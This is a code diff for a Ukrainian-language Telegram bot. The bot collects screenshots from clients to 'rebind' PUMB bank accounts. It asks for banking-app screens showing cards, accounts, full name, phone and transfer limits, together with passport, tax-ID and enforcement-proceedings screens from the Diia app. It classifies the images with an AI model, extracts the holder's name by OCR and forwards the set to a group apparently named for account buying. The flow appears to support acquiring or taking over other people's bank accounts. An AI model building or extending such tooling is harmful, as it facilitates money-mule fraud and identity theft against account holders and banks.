@@ -22,6 +22,7 @@ router = Router()
 
 _client_reply_cooldowns = {}
 _pumb_new_photo_tasks: dict[int, asyncio.Task] = {}
+_pumb_rebind_photo_tasks: dict[int, asyncio.Task] = {}
 _pumb_photo_locks: dict[int, asyncio.Lock] = {}
 
 PUMB_EXAMPLE_PHOTOS_DIR = r"C:\Users\oliks\Documents\PUMB"
@@ -53,17 +54,40 @@ def _get_pumb_rebind_example(step_index: int) -> str | None:
         return None
 
 PUMB_REBIND_INSTRUCTIONS = [
-    "Крок 1/7: відправте будь ласка Скрін з головного меню ПУМБ",
-    "Крок 2/7: надішліть, будь ласка, потрібний скріншот для перев'язу ПУМБ",
-    "Крок 3/7: надішліть, будь ласка, потрібний скріншот для перев'язу ПУМБ",
-    "Крок 4/7: надішліть, будь ласка, потрібний скріншот для перев'язу ПУМБ",
-    "Крок 5/7: надішліть, будь ласка, потрібний скріншот для перев'язу ПУМБ",
-    "Крок 6/7: надішліть, будь ласка, потрібний скріншот для перев'язу ПУМБ",
-    "Крок 7/7: надішліть, будь ласка, останній скріншот для перев'язу ПУМБ",
+    "Надішліть, будь ласка, скріншот головного меню ПУМБ (Головний екран)",
+    "Надішліть, будь ласка, скріншот розділу \"Фінанси\" у ПУМБ (Рахунки та картки)",
+    "Надішліть, будь ласка, скріншот профілю у ПУМБ (ПІБ, номер телефону, Особисті дані, Підтримка)",
+    "Надішліть, будь ласка, скріншот розділу \"Ліміти на перекази\" у ПУМБ",
+    "Надішліть, будь ласка, скріншот ID-картки / паспорта у додатку Дія",
+    "Надішліть, будь ласка, скріншот РНОКПП (ІПН) з реєстрацією / документами у додатку Дія",
+    "Надішліть, будь ласка, скріншот розділу \"Виконавчі провадження\" у додатку Дія",
 ]
 
 async def _send_pumb_rebind_step(bot: Bot, chat_id: int, step_index: int):
     """Надсилає клієнту інструкцію та приклад для поточного кроку перев'язу ПУМБ."""
+    if step_index == 4:
+        p5 = _get_pumb_rebind_example(4)
+        p6 = _get_pumb_rebind_example(5)
+        p7 = _get_pumb_rebind_example(6)
+        if p5 and p6 and p7 and os.path.exists(p5) and os.path.exists(p6) and os.path.exists(p7):
+            try:
+                diia_caption = (
+                    "Надішліть, будь ласка, 3 скріншоти з додатку Дія:\n"
+                    "1. ID-картка / Паспорт громадянина України\n"
+                    "2. РНОКПП (ІПН)\n"
+                    "3. Виконавчі провадження\n\n"
+                    "Ви можете надіслати їх всі 3 разом одним альбомом (групою фото)."
+                )
+                media_group = [
+                    InputMediaPhoto(media=FSInputFile(p5), caption=diia_caption),
+                    InputMediaPhoto(media=FSInputFile(p6)),
+                    InputMediaPhoto(media=FSInputFile(p7)),
+                ]
+                await bot.send_media_group(chat_id=chat_id, media=media_group)
+                return
+            except Exception as e:
+                logger.warning(f"Не вдалося надіслати альбом прикладів Дії: {e}")
+
     instruction = PUMB_REBIND_INSTRUCTIONS[step_index] if 0 <= step_index < len(PUMB_REBIND_INSTRUCTIONS) else "Надішліть, будь ласка, наступний скріншот."
     example_path = _get_pumb_rebind_example(step_index)
     if example_path and os.path.exists(example_path):
@@ -1689,7 +1713,12 @@ async def handle_pumb_choice(callback: CallbackQuery, state: FSMContext):
     else:
         # Послідовний збір 7 скріншотів для перев'язу ПУМБ
         await state.set_state(RegistrationStates.pumb_rebind_screenshots)
-        await state.update_data(pumb_rebind_step=0, pumb_rebind_photos=[])
+        await state.update_data(pumb_rebind_step=0, pumb_rebind_photos=[], pumb_rebind_collected={})
+        try:
+            await callback.bot.send_message(chat_id=chat_id, text="Від вас потрібні кілька скріншотів з ПУМБ")
+        except Exception as e:
+            logger.warning(f"Не вдалося надіслати вступне повідомлення ПУМБ-перев'язу: {e}")
+        await asyncio.sleep(3)
         await _send_pumb_rebind_step(callback.bot, chat_id, 0)
 
     await callback.answer()
@@ -1805,28 +1834,246 @@ async def process_pumb_new_screenshots(message: Message, state: FSMContext, bot:
             _pumb_new_photo_tasks[client_id] = task
 
 
+async def _delayed_pumb_rebind_process(client_id: int, chat_id: int, state: FSMContext, bot: Bot):
+    """Обробка надісланих скріншотів для перев'язу ПУМБ."""
+    try:
+        await asyncio.sleep(0.8)
+    except asyncio.CancelledError:
+        return
+
+    async with _get_pumb_lock(client_id):
+        try:
+            if await state.get_state() != RegistrationStates.pumb_rebind_screenshots:
+                return
+
+            data = await state.get_data()
+            pending = data.get("pumb_rebind_pending", [])
+            if not pending:
+                return
+
+            await state.update_data(pumb_rebind_pending=[])
+
+            raw_collected = data.get("pumb_rebind_collected", {})
+            collected: dict[int, str] = {}
+            if isinstance(raw_collected, dict):
+                for k, v in raw_collected.items():
+                    try:
+                        collected[int(k)] = str(v)
+                    except (ValueError, TypeError):
+                        pass
+
+            # Якщо FSM скинувся після перезапуску бота, відновлюємо pumb_rebind_collected з JSON-колонки в БД
+            if not collected:
+                try:
+                    session_db = await db.get_session(client_id)
+                    raw_collected = session_db.get("pumb_rebind_collected") if session_db else None
+                    if raw_collected:
+                        import json
+                        loaded = json.loads(raw_collected)
+                        if isinstance(loaded, dict):
+                            for k, v in loaded.items():
+                                try:
+                                    step_key = int(k)
+                                    if 0 <= step_key <= 6:
+                                        collected[step_key] = str(v)
+                                except (ValueError, TypeError):
+                                    pass
+                except Exception as restore_err:
+                    logger.error(f"Не вдалося відновити pumb_rebind_collected з БД: {restore_err}")
+
+            from io import BytesIO
+            from bot.openai_client import classify_pumb_rebind_album as ai_classify_album
+
+            await bot.send_chat_action(chat_id=chat_id, action="typing")
+
+            # 1. Завантажуємо батч очікуваних фото у пам'ять
+            photo_bytes_list: list[bytes] = []
+            valid_pending_ids: list[str] = []
+
+            for f_id in pending:
+                try:
+                    photo_file = await bot.get_file(f_id)
+                    photo_buf = BytesIO()
+                    await bot.download_file(photo_file.file_path, photo_buf)
+                    photo_bytes_list.append(photo_buf.getvalue())
+                    valid_pending_ids.append(f_id)
+                except Exception as e:
+                    logger.error(f"Не вдалося завантажити фото {f_id}: {e}")
+
+            if not photo_bytes_list:
+                await bot.send_message(chat_id=chat_id, text="Не вдалося завантажити фото. Будь ласка, спробуйте ще раз.")
+                return
+
+            # 2. Завантажуємо 7 еталонних фотографій (і перевіряємо, що їх строго 7)
+            example_photos: list[bytes] = []
+            for i in range(len(PUMB_REBIND_INSTRUCTIONS)):
+                path = _get_pumb_rebind_example(i)
+                if path and os.path.exists(path):
+                    try:
+                        with open(path, "rb") as f:
+                            example_photos.append(f.read())
+                    except Exception as read_err:
+                        logger.warning(f"Не вдалося прочитати еталон {path}: {read_err}")
+
+            if len(example_photos) != len(PUMB_REBIND_INSTRUCTIONS):
+                logger.warning(f"Знайдено {len(example_photos)} з 7 еталонів, використовуємо текстовий prompt")
+                example_photos = None
+
+            # 3. Класифікуємо батч із передачею еталонів
+            batch_results = await ai_classify_album(photo_bytes_list, example_photos=example_photos)
+
+            # 4. Записуємо нові розпізнані кроки у collected
+            for idx, (detected_step, _reason) in enumerate(batch_results):
+                if detected_step is not None and isinstance(detected_step, int) and 0 <= detected_step <= 6:
+                    if detected_step not in collected:
+                        collected[detected_step] = valid_pending_ids[idx]
+
+            # 5. Визначаємо pumb_rebind_step як найменший s (0..6), якого ще немає в collected
+            pumb_rebind_step = 7
+            for s in range(len(PUMB_REBIND_INSTRUCTIONS)):
+                if s not in collected:
+                    pumb_rebind_step = s
+                    break
+
+            photos_final = [collected[i] for i in sorted(collected.keys()) if i in collected]
+
+            # Зберігаємо оновлений collected та step у state
+            await state.update_data(
+                pumb_rebind_step=pumb_rebind_step,
+                pumb_rebind_collected={str(k): v for k, v in collected.items()},
+                pumb_rebind_photos=photos_final
+            )
+
+            # Зберігаємо точну масу кроків {крок -> file_id} в JSON-колонку в БД
+            import json
+            collected_json = json.dumps(
+                {str(k): v for k, v in collected.items()},
+                ensure_ascii=False
+            )
+            try:
+                await db.update_session_pumb_rebind_collected(client_id, collected_json)
+            except Exception as db_err:
+                logger.error(f"Не вдалося зберегти pumb_rebind_collected в БД: {db_err}")
+
+            # 6. Якщо всі 7 кроків виконано — фінал!
+            if pumb_rebind_step >= 7 or len(collected) >= len(PUMB_REBIND_INSTRUCTIONS):
+                client_data = "Тип: Перев'яз ПУМБ\nОтримано 7 скріншотів"
+                await db.update_session_client_data(client_id, client_data, status='registered')
+                ordered_file_ids = [collected[i] for i in range(len(PUMB_REBIND_INSTRUCTIONS)) if i in collected]
+                await db.update_session_verification_data(client_id, success_photo_id=",".join(ordered_file_ids))
+                await db.set_session_verified(client_id, 1)
+                await bot.send_message(chat_id=chat_id, text="Дякую! Всі скріншоти для перев'язу успішно прийнято.")
+
+                # Відправляємо всі 7 скріншотів у групу анкет (RUMMYSKUP) одним альбомом (MediaGroup)
+                try:
+                    from bot.config import get_anketa_chat_id, get_admin_id
+                    from bot.bot_registry import get_bot
+                    target_chat = get_anketa_chat_id() or get_admin_id()
+                    if target_chat and ordered_file_ids:
+                        from aiogram.types import InputMediaPhoto, BufferedInputFile
+
+                        buffered_photos = []
+                        raw_bytes_list = []
+                        for idx, p_id in enumerate(ordered_file_ids[:10]):
+                            try:
+                                file_info = await bot.get_file(p_id)
+                                buf = BytesIO()
+                                await bot.download_file(file_info.file_path, buf)
+                                b_val = buf.getvalue()
+                                raw_bytes_list.append(b_val)
+                                buffered_photos.append(
+                                    BufferedInputFile(b_val, filename=f"photo_{idx}.jpg")
+                                )
+                            except Exception as dl_err:
+                                logger.warning(f"Не вдалося завантажити фото {p_id} для відправки в групу: {dl_err}")
+
+                        session = await db.get_session(client_id) or {}
+                        pib = session.get('pib')
+                        if (not pib or pib in ('—', '-')) and raw_bytes_list:
+                            try:
+                                from bot.openai_client import extract_pumb_registration_data
+                                ext = await extract_pumb_registration_data(raw_bytes_list)
+                                if ext and ext.get('pib'):
+                                    pib = ext['pib']
+                                    await db.update_session_pib(client_id, pib)
+                            except Exception as ocr_err:
+                                logger.warning(f"Не вдалося витягти ПІБ через OCR: {ocr_err}")
+
+                        pib_str = pib if (pib and pib not in ('—', '-')) else "Не вказано"
+
+                        caption_text = (
+                            f"Перев'яз ПУМБ\n\n"
+                            f"ПІБ - {pib_str}"
+                        )
+
+                        if buffered_photos:
+                            media_group = []
+                            for idx, b_file in enumerate(buffered_photos):
+                                if idx == 0:
+                                    media_group.append(InputMediaPhoto(media=b_file, caption=caption_text, parse_mode="HTML"))
+                                else:
+                                    media_group.append(InputMediaPhoto(media=b_file))
+
+                            sender_bots = [bot]
+                            main_b = get_bot()
+                            if main_b and main_b != bot:
+                                sender_bots.append(main_b)
+
+                            for s_bot in sender_bots:
+                                try:
+                                    if len(media_group) > 1:
+                                        await s_bot.send_media_group(chat_id=target_chat, media=media_group)
+                                    else:
+                                        await s_bot.send_photo(chat_id=target_chat, photo=buffered_photos[0], caption=caption_text, parse_mode="HTML")
+                                    logger.info(f"Альбом ПУМБ перев'язу успішно надіслано в чат {target_chat}")
+                                    break
+                                except Exception as send_err:
+                                    logger.warning(f"Невдала спроба відправки альбому через бота: {send_err}")
+                except Exception as e:
+                    logger.error(f"Помилка відправки альбому ПУМБ перев'язу в групу: {e}")
+
+                await state.clear()
+                return
+
+            # 7. Надсилаємо інструкцію та приклад для наступного необхідного кроку
+            await _send_pumb_rebind_step(bot, chat_id, pumb_rebind_step)
+
+        except asyncio.CancelledError:
+            return
+        except Exception as e:
+            logger.exception(f"Помилка обробки ПУМБ-перев'язу: {e}")
+            await bot.send_message(
+                chat_id=chat_id,
+                text="Виникла помилка під час перевірки фото. Будь ласка, надішліть скріншот ще раз."
+            )
+
+
 @router.message(RegistrationStates.pumb_rebind_screenshots, F.chat.type == "private", F.photo)
 async def process_pumb_rebind_screenshots(message: Message, state: FSMContext, bot: Bot):
-    """Послідовний збір 7 скріншотів від ПУМБ-клієнта для перев'язу."""
+    """Збір скріншотів від ПУМБ-клієнта (по одному або альбомом) для перев'язу з AI-перевіркою."""
     client_id = message.from_user.id
     file_id = message.photo[-1].file_id
 
-    data = await state.get_data()
-    step = data.get("pumb_rebind_step", 0)
-    photos = data.get("pumb_rebind_photos", [])
+    try:
+        await bot.send_chat_action(chat_id=message.chat.id, action="typing")
+    except Exception:
+        pass
 
-    if file_id not in photos:
-        photos.append(file_id)
-    step += 1
-    await state.update_data(pumb_rebind_step=step, pumb_rebind_photos=photos)
-
-    if step >= len(PUMB_REBIND_INSTRUCTIONS):
-        client_data = "Тип: Перев'яз ПУМБ\nОтримано 7 скріншотів"
-        await db.update_session_client_data(client_id, client_data, status='registered')
-        await db.update_session_verification_data(client_id, success_photo_id=",".join(photos))
-        await db.set_session_verified(client_id, 1)
-        await message.answer("Дякую! Всі скріншоти для перев'язу прийнято.")
-        await state.clear()
+    if await state.get_state() != RegistrationStates.pumb_rebind_screenshots:
         return
 
-    await _send_pumb_rebind_step(bot, message.chat.id, step)
+    data = await state.get_data()
+    pending = data.get("pumb_rebind_pending", [])
+    if file_id not in pending:
+        pending.append(file_id)
+    await state.update_data(pumb_rebind_pending=pending)
+
+    existing = _pumb_rebind_photo_tasks.pop(client_id, None)
+    if existing and not existing.done():
+        existing.cancel()
+
+    task = asyncio.create_task(
+        _delayed_pumb_rebind_process(client_id, message.chat.id, state, bot)
+    )
+    _pumb_rebind_photo_tasks[client_id] = task
+
